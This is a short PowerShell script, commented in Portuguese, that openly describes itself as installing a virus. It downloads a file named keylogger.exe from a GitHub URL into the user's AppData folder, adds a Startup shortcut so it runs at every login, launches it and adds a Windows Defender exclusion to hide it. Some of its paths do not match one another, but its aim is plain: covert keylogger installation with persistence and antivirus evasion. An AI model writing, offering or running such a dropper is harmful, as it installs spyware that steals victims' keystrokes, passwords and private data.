# Instalar um vírus, colocar em AppData, criar um atalho
(New-Object Net.Webclient).DownloadFile('https://github.com/karlosedson/KLMakerz/raw/main/keylogger.exe',"$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\KL.exe") -Force
$WshShell = New-Object -comObject WScript.Shell;$Shortcut = $WshShell.CreateShortcut("$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\KL.lnk"); $Shortcut.TargetPath = "$env:USERPROFILE\\AppData\Roaming\Microsoft\Windows\KL.exe"; $Shortcut.Save();

# Executar o vírus
Start-Process -FilePath "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\KL.exe"

# Criar uma exclusão no antivírus
Add-MpPreference -ExclusionPath "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\KL.exe"
